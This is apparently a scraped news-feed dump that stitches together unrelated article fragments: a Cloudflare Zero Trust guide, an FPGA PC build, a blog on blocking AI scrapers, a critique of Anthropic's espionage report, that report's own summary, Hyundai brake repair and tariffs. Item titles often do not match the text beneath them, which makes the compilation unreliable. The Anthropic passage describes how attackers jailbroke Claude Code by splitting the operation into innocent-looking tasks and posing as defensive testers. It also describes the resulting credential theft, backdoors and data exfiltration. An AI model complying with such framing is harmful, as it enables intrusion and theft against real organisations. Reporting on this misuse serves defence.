Trust is running on a machine: No login screenNo Warp running (public access): Prompt for login screen, but only allow specific emails that authenticated through GitHubThis setup makes it very convenient to reach homeassistant, no matter if connected through Warp or not.Deploying the Warp client and enrolling into Zero Trust#Our network is basically done. We have a login-protected homeassistant.mydomain.com that routes through our tunnel into our private network and terminates at , and we have a direct route to  that only works when connected with Warp.We also have login policies to make sure only specific users (logged in with GitHub and certain email addresses) can access homeassistant.So how do we deploy the dang Warp client?Actually the same: We create some policies.Head to Settings -> Warp ClientIn , we specify the same policies for who can enroll. For example, “[email protected]” when authenticated through GitHub is allowed to enroll. In the  we can specify what login methods are available when someone tries to enroll into our Zero Trust org.Toggle WARP authentication identity settings to make the  selector available in policies, effectively allowing the configured WARP client to be used as a login method., once someone is enrolled, they are basically in your Zero Trust network through Warp. Make sure you harden this.Then, in , we define how the WARP client behaves. These are things like protocol: MASQUE or WireGuard, service mode, what IPs and domains to exclude from WARP routing (e.g., the local network should never go through WARP), setting it to exclude or include mode and so on.Other settings I recommend setting:Install CA to system certificate store - installs the Cloudflare CA certificate automatically when enrolled.Override local interface IP - assigns a unique CGNAT private IP to the client. This is needed for warp-to-warp routing. - what checks the WARP client should perform for the org. E.g., check the OS version, some OS files on disk, etc. I have this set to  and  because I want the client to provide information on whether the user is connected through WARP and Gateway, for skipping certain login pages.Once done, just open the Warp client (https://developers.cloudflare.com/warp-client/), and log in to your network. This should open the login pages you specified in the  screen, and check all the enrollment policies you specified.Once passed, congratulations, your WARP client is now connected to your Zero Trust network. The client will then go ahead and start routing  through your tunnels, as specified in your tunnel and route settings.If you followed this guide, here is what we built:Login methods to connect the Warp client to your Zero Trust org through GitHub and specific email addressesA  within your private network thatForwards any request coming in with host homeassistant.mydomain.com to A  that forwards all traffic for  to the tunnel in your private network, which will terminate it at 192.168.1.3, which will only work when connected through Warp to route the requestA DNS name homeassistant.mydomain.com that points to the Argo tunnel, and will allow everyone (even if not connected through Warp) to access homeassistant which runs at 192.168.1.3Access policies that willAsk users that are not connected to Zero Trust through Warp to log in with GitHub and specific email, so everyone can access it if they can log inA policy that skips the login screen completely and just shows homeassistant if the user connects through Zero Trust Warp client (enrolled into our org)You don’t need the public domain and you don’t need the route to 192.168.1.3. These are 2 different options that you can use to expose homeassistant when you’re not at home. One is using a public domain name everyone can see, one is explicitly requiring connecting through enrolled Warp.What I  cover in this post:Creating and assigning fully private IPs that only exist within your Zero Trust networkSSH authentication through Zero Trust access policies (that’s what we need  for)The other application types besides I’m happy to expand on it if there’s interest.

I had a clear goal in mind: I wanted to be able to play the EGA version of Monkey Island 1 on it, with no features missing. This means I need mouse support, hard drive with write access for saving the game, and Adlib audio, my preferred version of the game’s musical score.The catalyst for this project was the discovery that there are low-power versions of the NEC V20 CPU available (UPD70108H), which is compatible with the Intel 8088 used in the XT. Being a low-power version significantly simplifies its connection to an FPGA, which typically operate with 3.3-volt IO voltages. Coupled with a low-power 1MB SRAM chip (CY62158EV30) to provide the XT with its 640KB of memory, and I started to have the bones of a complete system worked out.I started off by designing the hardware of the system, which would then serve as my development board while I worked on the software/gateware. The following features were added:– DIP-40 socket for an low power NEC V20 CPU– 1MB SRAM chip for the system memory– An icesugar-pro FPGA board with a Lattice LFE5U-25F– Dual PS/2 connectors for keyboard and mouse– Micro SD card socket to act as a Fixed Disk– An authentic YM3014B digital-to-analogue converter for audio– A Piezo speaker that can be driven by the programmable-interval-timer for system bleeps– Lastly, a reset switch and some status LEDsI drew up my design using the EasyEDA CAD software as I’m already familiar with it, and it has really good integration with the JLCPCB PCB assembly service. Some of the components in the design are too tricky for me to hand solder by myself. I did however have to solder the SRAM chips once the boards arrived since they were not stocked by LCSC so I had to source them elsewhere.The first step was to write a bus controller for the processor. The V20 CPU clock is more forgiving than an original i8088 since its can be run right down to 0hz and its uses a regular 50% duty cycle. The external interface for an 8088 CPU operates in terms of bus cycles. At that start of a bus cycle the CPU asserts some pins to let everyone know what it wants to try and do… read memory, write to IO, etc. Each type of bus cycle follows a specific sequence of events that happen over a number of clock cycles. It was straight forward to make a state machine that could detect the start of a bus-cycle, figure out what kind it was, and then produce or consume the data as needed by the CPU. Key here, was to make sure that all of the timing requirements were met, so that signals the CPU generates are sampled at the correct time, and signals the CPU requires have been driven correctly before the CPU reads them.My first test for the bus controller was to write a simple program using NASM to be executed on the V20, with a simple goal… it will flash an LED mapped to an IO port address. Simple, but a blinking LED seems to be the hardware equivalent of the software hello-world. For the initial version, the program was simply loaded into a FPGA block ram and used directly as the system memory.Later, I used a more complex approach for memory accesses. The bios, for example, is loaded into an FPGA block ram, so that CPU memory reads will come from that rather than the system SRAM chip. Video memory is implemented a differently still. CPU memory writes are passed to both the video memory block ram and system SRAM, but CPU reads alway come from only the system SRAM. This then means that I have a spare read port on the video block ram that can then be used by the VGA signal generator to display the video memory contents.Once I was confident the basic system was stable I then swaped in a generic XT bios from https://www.phatcode.net in place of the diagnostic ROM. It was amazing to see the bios start to boot up, and complain when it couldnt find a boot disk.Fixed Disk access is achieved by making a small Verilog SPI controller accessible to the CPU via some unused IO ports. I then wrote an option ROM to handle BIOS INT13H (disk service) calls, which had routines that could issue commands to the SD-Card over SPI. The tricky part for me was learning the SD card protocol and then writing 8088 assembly to perform the correct operations. The mapping itself is very straightforward as both SD card and DOS assume 512byte sectors.Perhaps the hardest part of the project was, surprisingly, getting the mouse to work. Mice of the XT era would typically be connected to a UART serial port. I had however placed a PS/2 connector on the hardware board, and those mice use a very different protocol. In my efforts to support a mouse I startedto learn about PS/2 devices, however I would need to implement a much more complex keyboard controller, and the BIOS I was also lacked support for such modern peripherals, and I just plain didn’t feel like I understood everything required to get that working.What makes it tricky is that PS/2 is a bidirectional protocol, and the mouse has to be asked by the PC to broadcast updates, otherwise we will not receive any. That added a lot more complexity than I was wanting. The keyboard on the otherhand is relatively easy to work with and send out keypresses without having to be asked.I chose an alternative. I wrote some Verilog code to talk directly to the PS/2 mouse, which would early in the boot process tell it to start sending over mouse events, as they have to be requested. When the bridge then receives mouse events, it translates and presents them to the computer via a pseudo UART peripheral. I had implemented a basic PS/2 mouse to Serial mouse bridge. A little convoluted but it works really well.During this process, I lobotomised a spare mouse by attaching a logic analyser the clk and dat pads inside the mouse. I was then able to capture the communications between a real PC and the mouse and observe it during use. This gave me invaluable insight into exactly how the protocol worked, and what a real mouse expected.I also found that having real waveforms to look at made it much easier to test components of my design in verilator, a Verilog simulator, as I could closely model the stimulus it should see when running in the FPGA.Just like the XT, one of the channels of the PIT timer is used to drive the internal speaker to produce bleep and bloop sounds. I extended this by having disk accesses trigger short pulses out of the peizo speaker as a crude emulation of a hard disk seeking. I think it really adds to the experience when you can hear your computer thinking away while doing its tasks. When it comes to music, the internal PC speaker quickly looses its charm however. Writing an YM3812 implementation (the FM chip used in the Adlib card) is beyond my skill level but thankfully Jose Tejada has written an amazing open source version that I was able to pull into my project; https://github.com/jotego/jtopl.I wrote a small Verilog module to take the PCM sample data generated by this soft YM3812 and convert it to the unusual 3:10 floating point format required by the YM3014 DAC on my board. This is very similar to the operation of the real Adlib hardware, where the YM3812 generates and sends serial audio data to a YM3014 DAC chip. A modern I2S DAC may have been cleaner, but having a chance to play with the authentic DAC seemed a little more fun to me. All of this combined results in the same lovely crisp FM tones I was so fond of when I played games on my PC growing up.A lot of other elements of this project have been glossed over or omitted, such as support for CGA and EGA graphics. There is even a USB to UART bridge for sending files from a host PC directly to the SD card. I also made some nice clear acrylic panels on a CNC machine to round off the design and protect the bare PCB.A video demo is shown below.Unfortunately there is a ton of screen tearing due to the phase between the monitor and my camera. It isn’t visible in person.]]></content:encoded></item><item><title>Google to flag Android apps with excessive battery use on the Play Store</title><link>https://www.bleepingcomputer.com/news/security/google-to-flag-android-apps-with-excessive-battery-use-on-the-play-store/</link><author>Bill Toulas</author><category>security</category><pubDate>Sun, 16 Nov 2025 15:15:25 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[Google will start taking action on Android apps in the official Google Play store that have high background activity and cause excessive battery draining.

This wasn’t the first time, nor is it the first time I’m seriously considering employing more aggressive countermeasures such as Anubis (see for example the June 2025 summary post). But every time something like this happens, a portion of the software hobbyist in me dies. We should add this to the list of things AI scrapers destroy next to our environment, the creative enthusiasm of the individuals who made things that are being scraped, and our critical thinking skills.When I tried accessing Brain Baking, I was met with an unusual delay that prompted me to login and see what’s going on. A simple  revealed both Gitea and the Fail2ban server gobbling up almost all CPU resources. Uh oh. Quickly killing Gitea didn’t reduce the work of Fail2ban as the Nginx access logs were being flooded with entries such as:47.79.216.157 - - [27/Oct/2025:13:05:34 +0100] "GET /wgroeneveld/brainbaking/src/commit/4359ae68930de084df09e1cfa05ffd4520fb7e40/content/links.md?display=source HTTP/1.1" 502 568 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36"

I have enough fail safe systems in place to block bad bots but the user agent Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36 isn’t immediately recognized as “bad”: it’s ridiculously easy to spoof that HTTP header. Most user agent checkers I throw this string at claim this agent isn’t a bot. That means we shouldn’t only rely on this information.Also, I temporarily block isolated IPs that keep on poking around (e.g. rate limiting on Nginx that get pulled into the ban list) but of course these scrapers never come from a single source. Yet the base attacking IP ranges remained the same: . The website ipinfo.io can help in identifying the threat: AS45102 Alibaba (US) Technology Co., Ltd.. Huh?Apparently, Alibaba provides hosting from Singapore that is frequently being abused by attackers. Many others that host forums software such as PhpBB experienced the same problems and although the AbuseIPDB doesn’t report recent issues on the IPs from the above logs, I went ahead and blocked the entire range.Fail2ban was struggling to keep up: it ingests the Nginx access.log file to apply its rules but if the files keep on exploding… Piping cat access.log | grep /commit/ | cut -d " " -f 1 to instant-ban everyone trying to access Git’s commit logs simply wasn’t fast enough. The only thing that had immediate effect was sudo iptables -I INPUT -s 47.79.0.0/16 -j DROP.In case that wasn’t yet clear: I hate having to deal with this. It’s a waste of time, doesn’t hold back the next attack coming from another range, and intervening always happens too late. But worst of all, semi-random fire fighting is just one big mood killer. I just  this won’t be enough. Having a robust anti attacker system in place might increase the odds but that means either resorting to hand cannons like Anubis or moving the entire hosting to CloudFlare that will do it for me. But I don’t want to fiddle with even more moving components and configuration, nor do I want to route my visitors through tracking-enabled USA servers.That Gitea instance should be moved off-site, or better yet, I should move the migration to Codeberg to the top of my TODO list. Yet it’s sad to see that people who like fiddling with their own little servers are increasingly punished for doing so, pushing many to a centralized solution, making things worse in the long term. The internet is no longer a safe haven for software hobbyists. I could link to dozens of other bloggers who reported similar issues to further solidify my point.Other things I’ve noticed is increased traffic with Referer headers coming from strange websites such as , , and . It’s not like any of these giants are going to link to an article on this site. I don’t understand what the purpose of spoofing that header is besides upping the hits count?However worse things might get, I refuse to give in.It’s just like 50 Cent said: Get Hostin’ Or Die Tryin’.]]></content:encoded></item><item><title>Brimstone: ES2025 JavaScript engine written in Rust</title><link>https://github.com/Hans-Halverson/brimstone</link><author>ivankra</author><category>dev</category><pubDate>Sun, 16 Nov 2025 11:41:10 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Anthropic’s paper smells like bullshit</title><link>https://djnn.sh/posts/anthropic-s-paper-smells-like-bullshit/</link><author>vxvxvx</author><category>dev</category><pubDate>Sun, 16 Nov 2025 11:32:39 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[A report was recently published by an AI-research company called Anthropic.
They are the ones who notably created Claude, an AI-assistant for coding. Personally, I don’t use it but that is besides the point.
Before we start, it’s important to say I don’t have anything against them, or AI in general. I do have some documented concerns but I am not “Anti-AI”, or whatever.
Rather than the technology itself, it’s the industry’s perception of it, and the way it is inserted everywhere, even when unnecessary that bothers me. However, that too is a bit besides the point.Today, I wanted to discuss the Paper (or Report, however you want to call it) that was recently published by them.
Looking at the executive summary, this paragraph jumps out immediately.In mid-September 2025, we detected a highly sophisticated cyber espionage operation
conducted by a Chinese state-sponsored group we’ve designated GTG-1002 that
represents a fundamental shift in how advanced threat actors use AI. Our investigation
revealed a well-resourced, professionally coordinated operation involving multiple
simultaneous targeted intrusions. The operation targeted roughly 30 entities and our
investigation validated a handful of successful intrusions.This is extremely interesting for many reasons:Anthropic seemingly disrupted an APT’s campaign, though a number of companies and government entities were affected,This highly-advanced APT doesn’t use its own infra, but rather relies on Claude to coordinate its automation (??? Why, though ?),I assume they run exploits and custom tools ? If so, what are these ?Anthropic was able to attribute this attack to a Chinese-affiliated state-sponsored group.If you’re like me, you then eagerly read the rest of the paper, hoping to find clues and technical details on the TTPs (Tactics, Techniques and Procedures), or IoCs (Indicators of Compromise) to advance the research.
However, the report very quickly falls flat, which sucks.where are the IoCs, Mr.Claude ?The primary goal of a Threat-Intelligence report such as this one would be to inform other parties of a new type of attack, and artefacts they might use to discover the attack on their network.
This is typically done by sharing domain-names linked with the campaign, MD5 or SHA512 hashes you could look for on Virus Exchange websites such as VirusTotal, or other markers that would help you verify that your
networks are safe. As an example, here is the French CERT sharing (in French, but an English version is available too) about APT28’s TTPs.MITRE ATT&CK used to determine what are the techniques used (eg: Account Manipulation, Antivirus evasion, etc.),Emails used for phishing, originating IPs and even date when these emails are sent,Tooling (VPN software, but also what kind of tools) used by the APT,This report is just one I picked randomly by skimming through their publications. Any serious CERT or Threat-Intel company would publish things in the same fashion, because this is the industry standard.
These publications are made public to inform Security Operation Centers around the world about how to detect and prevent those attacks.In this case, none of the these markers are present in the report. In fact, not a whole lot of the information is verifiable, which is another problem.The human operator tasked instances of Claude Code to operate in groups as autonomous penetration testing orchestrators and agents, with the threat actor able to leverage AI to execute 80-90% of tactical operations independently at physically impossible request ratesThis figure (80-90%) is not verifiable either. How do we know this is actually the case ?
I have no doubt so-called Autonomous agents are being used in these campaigns, in some capacity. However this report clearly states that Autonomous Agents perform active exploitation, and even data exfiltration.What kind of tooling is used ? What kind of information has been extracted ? Who is at risk ? How does a CERT identifies an AI agent in their networks ?
None of these questions are answered. It’s not like Anthropic doesn’t have access to this data, since they claim they were able to stop it.Upon receiving authorization from the human operators, Claude executed systematic
credential collection across targeted networks. This involved querying internal services,
extracting authentication certificates from configurations, and testing harvested
credentials across discovered systems.How ? Did it run Mimikatz ? Did it access Cloud environments ? We don’t even know what kind of systems were affected.
There is no details, or fact-based evidence to support these claims or even help other people protect their networks.The report goes on to claim that upon detection, the accounts were closed and implemented “enhancements”, and then drops this gem:We notified relevant authorities and industry partners, and shared information with impacted entities where appropriate.What is that even supposed to mean ? You claim your agents were able to find exploitable vulnerabilities in multiple services.
Were these patched ? What about the extracted data ? What about the affected people ? Do you care about this at all ?Look, is it very likely that Threat Actors are using these Agents with bad intentions, no one is disputing that. But this report does not meet the standard of publishing for serious companies.
The same goes with research in other fields. You  just claim things and not back it up in any way, and we  as an industry accept that it’s OK for companies to release this.There seem to be a pattern for Tech Companies (especially in AI, but they’re not the only culprits) out there to just announce things, generate hype and then under-deliever.
Just because it works with VCs doesn’t mean it should work with us. We should, as an industry, expect better.For instance, it attributes the attacks to a Chinese State-affiliated (!!!) group, but does not go on to give any details.
Which APT is it ? What helped you determine this ?Attribution is a  serious matter, with sometimes diplomatical implications. You can’t just go on and point the finger at anyone and expect people to believe you for no reason.
In a time of increasing tensions between the West and China, it does not seem like the smart thing to do at all. Frankly, I don’t understand who was stupid enough to approve this to be released.
For all we know, the “advanced threat actors” they’re talking about here could just be script kiddies trying to automate  and  commands.If they’re going to release IoCs and proof of everything, I’d be happy to share them here. But until them, I will say this: this paper would not pass any review board.
It’s irresponsible at best to accuse other countries of serious things without backing it up. Yes, I am aware that Chinese-linked APTs are out there and very aggressive, and Yes, I am aware that
Threat Actors misuse LLMs all the time, but that is besides the point. We need fact-based evidence. We need to be able to verify all this. Otherwise, anyone can say anything, on the premise that it’s
probably happening. But that’s not good enough.So if the report does not give any details on TTPs and detections, what was the purpose of this report exactly ?There is a paragraph at the end that seem to give us a clue:The cybersecurity community needs to assume a fundamental change has occurred: Security teams should experiment with applying AI for defense in areas like SOC automation, threat detection, vulnerability assessment, and incident response and build experience with what works in their specific environments.“Security teams should experiment with applying AI for defense”Hmm. But who sells this kind of AI they’re talking about here ?At the end of the day, this shit is a pathetic excuse of a report and should not be taken as anything else than a shameless attempt at selling more of their product.
This is shameful and extremely unprofessional, at best. This disregard for basics ethics in order to sell just a little bit more make me want to never use their product, ever.]]></content:encoded></item><item><title>Astrophotographer snaps skydiver falling in front of the sun</title><link>https://www.iflscience.com/the-fall-of-icarus-you-have-never-seen-an-astrophotography-picture-like-this-81570</link><author>doener</author><category>dev</category><pubDate>Sun, 16 Nov 2025 11:02:25 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[© 2025 IFLScience.

This was based on systematic evaluations showing cyber capabilities doubling in six months; we’d also been tracking real-world cyberattacks, observing how malicious actors were using AI capabilities. While we predicted these capabilities would continue to evolve, what has stood out to us is how quickly they have done so at scale.In mid-September 2025, we detected suspicious activity that later investigation determined to be a highly sophisticated espionage campaign. The attackers used AI’s “agentic” capabilities to an unprecedented degree—using AI not just as an advisor, but to execute the cyberattacks themselves.The threat actor—whom we assess with high confidence was a Chinese state-sponsored group—manipulated our Claude Code tool into attempting infiltration into roughly thirty global targets and succeeded in a small number of cases. The operation targeted large tech companies, financial institutions, chemical manufacturing companies, and government agencies. We believe this is the first documented case of a large-scale cyberattack executed without substantial human intervention.Upon detecting this activity, we immediately launched an investigation to understand its scope and nature. Over the following ten days, as we mapped the severity and full extent of the operation, we banned accounts as they were identified, notified affected entities as appropriate, and coordinated with authorities as we gathered actionable intelligence.This campaign has substantial implications for cybersecurity in the age of AI “agents”—systems that can be run autonomously for long periods of time and that complete complex tasks largely independent of human intervention. Agents are valuable for everyday work and productivity—but in the wrong hands, they can substantially increase the viability of large-scale cyberattacks.These attacks are likely to only grow in their effectiveness. To keep pace with this rapidly-advancing threat, we’ve expanded our detection capabilities and developed better classifiers to flag malicious activity. We’re continually working on new methods of investigating and detecting large-scale, distributed attacks like this one.In the meantime, we’re sharing this case publicly, to help those in industry, government, and the wider research community strengthen their own cyber defenses. We’ll continue to release reports like this regularly, and be transparent about the threats we find.How the cyberattack workedThe attack relied on several features of AI models that did not exist, or were in much more nascent form, just a year ago: Models’ general levels of capability have increased to the point that they can follow complex instructions and understand context in ways that make very sophisticated tasks possible. Not only that, but several of their well-developed specific skills—in particular, software coding—lend themselves to being used in cyberattacks.. Models can act as agents—that is, they can run in loops where they take autonomous actions, chain together tasks, and make decisions with only minimal, occasional human input.. Models have access to a wide array of software tools (often via the open standard Model Context Protocol). They can now search the web, retrieve data, and perform many other actions that were previously the sole domain of human operators. In the case of cyberattacks, the tools might include password crackers, network scanners, and other security-related software.The diagram below shows the different phases of the attack, each of which required all three of the above developments:In Phase 1, the human operators chose the relevant targets (for example, the company or government agency to be infiltrated). They then developed an attack framework—a system built to autonomously compromise a chosen target with little human involvement. This framework used Claude Code as an automated tool to carry out cyber operations.At this point they had to convince Claude—which is extensively trained to avoid harmful behaviors—to engage in the attack. They did so by jailbreaking it, effectively tricking it to bypass its guardrails. They broke down their attacks into small, seemingly innocent tasks that Claude would execute without being provided the full context of their malicious purpose. They also told Claude that it was an employee of a legitimate cybersecurity firm, and was being used in defensive testing.The attackers then initiated the second phase of the attack, which involved Claude Code inspecting the target organization’s systems and infrastructure and spotting the highest-value databases. Claude was able to perform this reconnaissance in a fraction of the time it would’ve taken a team of human hackers. It then reported back to the human operators with a summary of its findings.In the next phases of the attack, Claude identified and tested security vulnerabilities in the target organizations’ systems by researching and writing its own exploit code. Having done so, the framework was able to use Claude to harvest credentials (usernames and passwords) that allowed it further access and then extract a large amount of private data, which it categorized according to its intelligence value. The highest-privilege accounts were identified, backdoors were created, and data were exfiltrated with minimal human supervision.In a final phase, the attackers had Claude produce comprehensive documentation of the attack, creating helpful files of the stolen credentials and the systems analyzed, which would assist the framework in planning the next stage of the threat actor’s cyber operations.Overall, the threat actor was able to use AI to perform 80-90% of the campaign, with human intervention required only sporadically (perhaps 4-6 critical decision points per hacking campaign). The sheer amount of work performed by the AI would have taken vast amounts of time for a human team. At the peak of its attack, the AI made thousands of requests, often multiple per second—an attack speed that would have been, for human hackers, simply impossible to match.Claude didn’t always work perfectly. It occasionally hallucinated credentials or claimed to have extracted secret information that was in fact publicly-available. This remains an obstacle to fully autonomous cyberattacks.Cybersecurity implicationsThe barriers to performing sophisticated cyberattacks have dropped substantially—and we predict that they’ll continue to do so. With the correct setup, threat actors can now use agentic AI systems for extended periods to do the work of entire teams of experienced hackers: analyzing target systems, producing exploit code, and scanning vast datasets of stolen information more efficiently than any human operator. Less experienced and resourced groups can now potentially perform large-scale attacks of this nature.This attack is an escalation even on the “vibe hacking” findings we reported this summer: in those operations, humans were very much still in the loop, directing the operations. Here, human involvement was much less frequent, despite the larger scale of the attack. And although we only have visibility into Claude usage, this case study probably reflects consistent patterns of behavior across frontier AI models and demonstrates how threat actors are adapting their operations to exploit today’s most advanced AI capabilities.This raises an important question: if AI models can be misused for cyberattacks at this scale, why continue to develop and release them? The answer is that the very abilities that allow Claude to be used in these attacks also make it crucial for cyber defense. When sophisticated cyberattacks inevitably occur, our goal is for Claude—into which we’ve built strong safeguards—to assist cybersecurity professionals to detect, disrupt, and prepare for future versions of the attack. Indeed, our Threat Intelligence team used Claude extensively in analyzing the enormous amounts of data generated during this very investigation.A fundamental change has occurred in cybersecurity. We advise security teams to experiment with applying AI for defense in areas like Security Operations Center automation, threat detection, vulnerability assessment, and incident response. We also advise developers to continue to invest in safeguards across their AI platforms, to prevent adversarial misuse. The techniques described above will doubtless be used by many more attackers—which makes industry threat sharing, improved detection methods, and stronger safety controls all the more critical.Added an additional hyperlink to the full report in the initial sectionCorrected an error about the speed of the attack: not "thousands of requests per second" but "thousands of requests, often multiple per second"]]></content:encoded></item><item><title>Maybe you’re not trying</title><link>https://usefulfictions.substack.com/p/maybe-youre-not-actually-trying</link><author>eatitraw</author><category>dev</category><pubDate>Sun, 16 Nov 2025 10:14:25 +0000</pubDate><source url="https://news.ycombinator.com/best">Best of HackerNews</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Week in review: Windows kernel flaw patched, suspected Fortinet FortiWeb zero-day exploited</title><link>https://www.helpnetsecurity.com/2025/11/16/week-in-review-windows-kernel-flaw-patched-suspected-fortinet-fortiweb-zero-day-exploited/</link><author></author><category>security</category><pubDate>Sun, 16 Nov 2025 09:00:34 +0000</pubDate><source url="https://cvefeed.io/rssfeed/newsroom.xml">Latest Newsroom</source><content:encoded><![CDATA[

It sounds insane, but this is what new-car ownership is like in 2025. We did some digging and made contact with Hyundai to understand the situation and break it down for you—it’s a frustrating one.Having to talk to computers to fix a car isn’t necessarily unique to the Korean automaker, but I fell into a rabbit hole of Hyundai maintenance research here, so that’ll be our focus for the moment.Context for casual readers: Brake pad and rotor replacements are super basic car maintenance. You won’t need to do the job nearly as often on an electric car (thanks to regenerative braking), but even EV pads don’t last forever. On most cars, part of the job involves disconnecting or retracting the parking brake, which usually grabs the rear wheels. Many modern cars, and all EVs, have an electronic parking brake controlled by a computer signal, rather than a manually adjustable nut-and-cable situation. This is what sparked Redditor u/SoultronicPear’s justifiable frustration.One more piece of stage-setting: Since electronic parking brakes are indeed common, many readily available diagnostic tools (pretty basic OBD scanners) can issue a retract-brake command to a car’s ECU. Still, you do need one with bi-directional test functionality. Remember that point—it will become significant again in a few paragraphs.Apparently, no cheap scanner option worked on the original Reddit poster’s Ioniq 5 N. That led them on a journey of attempting to access commercial-grade car-repair gear, which was ultimately fruitless.You can access a Hyundai EV’s diagnostic brain using the brand’s proprietary dealership hardware and software (it’s called GDS, and it is publicly buyable but costs about six grand) or a third-party aftermarket system running a J2534 program. J2534 is an interface standard designed by the SAE and mandated by the EPA that basically ensures ECUs from different car brands can speak the same language for the sake of independent repair shops.Hyundai supports J2534 and recommends one of three machines for talking to its cars: CarDAQ Plus 3 (about $2,000), MTS 6531 (also about $2,000), and d-briDGe PRO (about $800). “…under no circumstances do we recommend the use of a non-approved J2534 device,” the company states. You would then also need a subscription to Hyundai’s J2534 Diagnostic Tool Software, which costs $60 a week (or less over longer time blocks). All this info is in .PDFs linked from Hyundai’s tech portal.At this point, after spending about $2,000 on tools, you should be able to service your own Hyundai Ioniq brakes, but if you’re a DIYer, you still can’t. Written in red at the top of one of Hyundai’s many tech documents is this: “Access to Bi-Directional Tests and Special Functions require Diagnostic Professional or Vehicle Security Professional credential from NASTF.”NASTF is the National Automotive Service Task Force. It exists “to identify and resolve gaps in service information, tool information, and training” between OEMs and independent shops (cool idea). It’s also the arbiter of things like lock coding and car credential management. To get scan-tool validation as a member, you need to be a professional mechanic.And with that final roadblock, we can confirm that, no, a DIYer can not do their own brakes on a Hyundai Ioniq 5 N.I’m guessing most of you reading this will now have the same thought I did—it does seem smart to have some regulation on sensitive data like the codes to your car locks, but what the heck, you should be able to do brake pads on a car you own. Or as Randy Marsh would have put it: “I’m sorry, I thought this was America!”Naturally, I also dropped Hyundai a note about this directly. Here’s what the automaker told us:“Hyundai is committed to supporting both our dealer network and independent repair facilities with safe, secure, and accessible service solutions. For vehicles equipped with electronic parking brakes, including the Ioniq 5 and Ioniq 5 N, the official repair procedure requires placing the rear calipers in service mode using either our Global Diagnostic System (GDS) or the J2534 application. This ensures proper functionality and customer safety. Hyundai recently expanded access through an update to our J2534 application, enabling aftermarket users to perform functions previously restricted by the GDS secure gateway. While authentication through NASTF is required for sensitive operations, this step helps maintain security and accountability. Our official dealer tool (GDS) is also available for purchase by anyone.Hyundai is actively exploring ways to make routine maintenance easier for all customers while upholding safety standards.“We appreciate the interest in DIY repairs and will continue working toward solutions that balance convenience with security.”So after all that, we can address the Reddit thread title “Hyundai declares WAR on Right to Repair” as technically incorrect. Right-to-repair legislation prevents product manufacturers from hiding technology behind proprietary diagnostic tools, and this stuff is not restricted to the brand’s own equipment. So, technically, I think the company’s in the clear on the rules as-written. We can also add a layer of clarification to the  post on this that was headlined as “Apparently You Need Hyundai’s Permission To Change Your Own Brakes.” It’s not Hyundai’s permission you need, it’s the NASTF’s.However, obviously, both and the guy on Reddit were totally right in principle. A car repair task that has historically been totally DIY’able in a driveway is now relegated to shop-only because of technology. And that’s not good.We focused on Hyundai here because this particular Reddit thread caught my eye and sent me on a research quest about this particular brand, but the Korean automaker is hardly the only company making it hard to mess with modern cars.I understand, and even appreciate, automakers wanting to be careful with things like lock and engine-starting encryption. You definitely don’t want anybody to be able to download your car keys and make off with your vehicle, or do worse. But there’s got to be a better middle-ground than this. People should have unfettered access to the cars (and tractors, and tools) they own, plain and simple.One last note: For anyone who found this article because you, too, are trying to get a modern car’s electronic brake to release for service but aren’t having luck … I did find this one tool that might be able to override the existing software. But I’m making no endorsement of it whatsoever—I’ve never used it and have no idea if it works or if using it might trigger any unintended consequences.

I try not to write anything even vaguely political on this blog because we have a variety of views on a variety of subjects and no one is here for that. We can all enjoy our geriatric little silicon artifacts together regardless of your electoral persuasion. But I was hopping mad this week, and the reason is actually on-topic, because I got hit with US Customs tariffs close to double the cost of the vintage items I was ordering and more than the items were worth. This eventually got straightened out, but it wouldn't have happened without my complaint and some time on the phone.

Although we make regular trips down under, your humble author is based in California and so is the Floodgap computer lab. For newly manufactured items and parts it has generally been my policy to buy parts from United States sellers even prior to the tariffs, mostly because that gets around various irregularities and it arrives more quickly. If they're going to drop-ship then it's their problem, not mine, because they advertised it was already here. Since such items are typically newly produced, the current tariffs would logically apply and this policy thus has the additional benefit of me not having to deal with that directly: any tariff should already have been paid to get them States-side.

But for NOS and used parts, especially if you are a collector like I am for certain systems, you buy where you can find them. Coincidentally I wanted to buy a second Apple Network Server logic board since my ANS 700 is acting a little weird (don't say caps) and I still want a good spare for the ANS 500. These don't exactly grow on trees but, as it turns out, the seller I bought my current spare logic board from (pre-tariffs) had another in stock. The logic board doesn't come with the regular ANS AIX ROM SIMM nor cache, so we'll want one each of those just in case, and he also had an Apple BTO Twin Turbo video card (I believe originally for the Power Macintosh 9500) which might also be nice for one of the other beige PCI Macs. These are all new old stock items in their Apple Service packaging because obviously Apple hasn't made nor sold any of these parts in decades. Per the seller, they came from the teardown of new machines which Apple was unable to sell and got turned into official surplus new stock. The seller is in an European Union country, so we're not talking some shady Shenzhen shop operating off an alley liftgate. (I'm not naming the seller because none of this is his fault and I'm sure he'd not like to be contacted about this.)

The items came to €296.00, about US$355 at the spot exchange rate, plus €48.10 for UPS shipping. This would have been well-under the prior  exemption even with the shipping rolled in. We had to do UPS because his particular country's postal service limits shipment value to the United States to US$100 due to the tariffs, causing him to spend a substantial amount of time at the UPS drop-off depot and on the paperwork, which was way more than he was required to do and I very much appreciate. For any import you need to come up with a Harmonized System code for what you're shipping, which then maps to a Harmonized Tariff Schedule code specific to the United States. These parts are all populated PCBs and most populated boards are, by prior rulings, classified with an HTS code of 8473.30, which is what the seller tagged all four items with. This code is for "Parts and accessories of the machines of heading 8471 [Automatic data processing machines and units thereof]." If you look under the Harmonized Tariff Schedule search engine for this code, you find a duty rate for certain subheadings that at  would be 35 percent, or even if these were products of the People's Republic of China (they're old enough that I don't know their exact provenance, but I have no evidence to believe these were originally), then maybe, maybe, an additional 25 percent. The declared value was the purchase price in euros and he even picked up the insurance. The package left the depot uneventfully and worked its way across the continent.

The first sign of trouble was over the weekend when I got an unexpected message.



